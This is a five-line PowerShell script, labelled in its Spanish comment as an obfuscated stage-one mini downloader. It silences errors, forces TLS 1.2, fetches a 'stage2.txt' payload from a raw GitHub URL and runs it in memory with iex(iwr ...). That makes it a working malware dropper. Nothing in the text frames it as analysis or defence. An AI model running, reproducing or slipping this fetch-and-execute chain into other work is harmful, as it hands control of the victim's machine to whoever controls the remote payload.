# Stage 1 - Mini downloader (ofuscado)
$ErrorActionPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$u='https://raw.githubusercontent.com/ggggwrmsfootmen/curly-fortnight/refs/heads/main/stage2.txt'
iex(iwr $u -UseBasicParsing).Content
